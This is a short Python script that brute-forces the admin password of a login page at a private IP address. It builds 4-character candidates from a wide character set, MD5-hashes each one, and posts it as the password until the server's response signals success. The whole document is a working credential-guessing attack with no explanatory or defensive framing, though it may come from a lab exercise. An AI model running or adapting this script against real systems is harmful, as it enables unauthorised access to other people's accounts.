import requests
import itertools as its
from hashlib import md5

def encrypt_md5(s):
    new_md5 = md5()
    new_md5.update(s.encode(encoding='utf-8'))
    return new_md5.hexdigest()

if __name__ == '__main__':
    url = "http://10.18.21.151/login.php"
    words = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'( )*+,-./:;<=>?@[]^_`{|}~"

    count = 1
    re = 4
    r = its.product(words, repeat=re)
    for i in r:
        str = "".join(i)
        pre = str
        count += 1
        if count > 100:
            break
        str = encrypt_md5(str)
        print(str, pre)
        payload = {'user_id': 'admin', 'password': str}
        res = requests.post(url, data=payload, timeout=10)
        print(res.text)
        if "-2" in res.text:
            print("password md5 is: ", str)
            print("password is:", pre)
            break